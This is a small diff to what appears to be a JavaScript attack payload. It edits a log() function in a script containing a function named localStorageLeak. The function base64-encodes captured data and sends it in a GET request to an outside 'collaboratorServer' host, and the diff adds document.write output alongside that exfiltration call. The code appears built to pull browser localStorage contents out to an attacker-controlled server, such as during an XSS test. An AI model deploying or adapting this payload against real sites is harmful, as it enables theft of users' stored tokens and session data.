@@ -105,7 +105,10 @@ function localStorageLeak(){
 }
 
 function log(data) {
-    makeRequest("https://" + collaboratorServer + "/log?msg=" + btoa(data), "GET", {});
+    document.write(data);
+	document.write("<br />");
+	makeRequest("https://" + collaboratorServer + "/log?msg=" + btoa(data), "GET", {});
+	
 }
 
 function makeRequest(url, method, headers) {
